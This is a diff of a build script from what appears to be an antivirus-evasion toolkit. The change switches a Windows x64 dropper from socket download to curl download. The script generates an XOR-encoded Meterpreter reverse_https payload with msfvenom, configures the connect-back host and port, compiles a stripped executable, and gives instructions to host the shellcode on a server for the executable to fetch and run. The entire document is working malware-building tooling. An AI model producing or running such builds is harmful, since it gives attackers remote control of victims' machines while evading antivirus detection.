@@ -2,7 +2,7 @@
 
 
 #DESCRIPTION_START
-# Downloads and executes 64-bit shellcode, using sockets. Applies metasploit XOR encoding.
+# Downloads and executes 64-bit shellcode, using curl. Applies metasploit XOR encoding.
 #DESCRIPTION_END
 
 
@@ -20,6 +20,7 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
 #CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
@@ -28,7 +29,7 @@ LHOST=$GLOBAL_LHOST
 set_command_source no_data
 set_command_exec no_command
 # enable debug output
-enable_debug_print
+enable_debug_print to_file C:/users/public/avetdbg.txt
 #CONFIGURATION_END
 
 
@@ -36,7 +37,7 @@ enable_debug_print
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin
 
 # set shellcode source
-set_payload_source download_socket
+set_payload_source download_curl
 
 # set decoder and key source
 set_decoder none
@@ -48,9 +49,12 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode64
 
+# enable debug output
+enable_debug_print to_file C:/users/public/avetdbg.txt
+
 # compile
-$win64_compiler -o output/downloadsocket_mtrprtrxor_revhttps_win64.exe source/avet.c -lwsock32 -lWs2_32
-strip output/downloadsocket_mtrprtrxor_revhttps_win64.exe
+$win64_compiler -o output/downloadcurl_mtrprtrxor_revhttps_win64.exe source/avet.c -lwsock32 -lWs2_32
+strip output/downloadcurl_mtrprtrxor_revhttps_win64.exe
 
 # cleanup
 cleanup_techniques
@@ -59,6 +63,6 @@ cleanup_techniques
 echo "
 # The generated msf shellcode file needs to be hosted on a HTTP server
 # Call the executable like:
-# $ downloadsocket_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
-# The executable downloads the shellcode into memory (no file is dropped on disk) and executes it.
+# $ downloadcurl_mtrprtrxor_revhttps_win64.exe http://yourserver/thepayload.bin
+# Downloads the payload to disk, then reads the file and executes the payload.
 "
